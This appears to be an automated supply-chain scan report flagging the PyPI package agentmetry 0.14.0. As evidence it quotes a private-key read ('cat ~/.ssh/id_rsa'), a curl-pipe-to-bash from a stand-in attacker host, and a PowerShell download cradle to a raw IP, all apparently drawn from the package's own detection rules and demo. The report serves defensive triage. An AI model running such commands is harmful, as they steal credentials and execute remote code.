# Suspicious package report: `agentmetry` 0.14.0 (pypi)

> Generated automatically by PkgWatch from static analysis. The package was **not** installed or executed. This is a lead for human review, not a verdict: false positives happen.

| | |
|---|---|
| Package | `agentmetry` |
| Version | `0.14.0` |
| Ecosystem | pypi |
| Risk score | 95 / 100 (high) |
| Published | 2026-11-24T20:43:17Z |
| Scanned | 2026-11-26T03:13:00Z |
| Registry page | https://pypi.org/project/agentmetry/0.14.0/ |

## Indicators

- **exfiltration** (high, +40): Code reads credential, browser, chat-token or wallet files and also makes network calls in the same file.

  Evidence in `agentmetry/demo.py`:

  ```text
  ctx.step(corr, "reads a private key", "cursor.Read", "cat ~/.ssh/id_rsa")
  ```

- **binary-dropper** (medium, +35): Code downloads a file and then executes it or marks it executable.

  Evidence in `agentmetry/core/audit/detection/rules.py`:

  ```text
  # Requiring a bare IP let `curl https://evil-cdn.example.com/x.sh | bash`
  ```

- **suspicious-endpoint** (medium, +20): URL with a raw IP address instead of a hostname.

  Evidence in `agentmetry-0.14.0/agentmetry/core/audit/detection/rules.py`:

  ```text
  DownloadString('http://185.220.101.5/a.ps1')` is a textbook download cradle:
  ```


## Suggested text for an upstream report

The pypi package `agentmetry` version `0.14.0` shows indicators consistent with a supply-chain attack. Static analysis (no execution) found:

- Code reads credential, browser, chat-token or wallet files and also makes network calls in the same file.
- Code downloads a file and then executes it or marks it executable.
- URL with a raw IP address instead of a hostname.

Please review the package and remove it if it violates registry policy.

## Before forwarding

1. Open the registry page and read the flagged files yourself.
2. Confirm the behaviour is not a legitimate feature of the package.
3. If it holds up, report it via the "Report project as malware" link on the project page, or security@pypi.org.
4. If it does not, record it here: https://github.com/abidranesh/typosquat_-_mal_package_tracker/issues/new?template=false-positive.yml&labels=false-positive&title=False%20positive%3A%20pypi%2Fagentmetry%400.14.0&package=pypi%2Fagentmetry%400.14.0
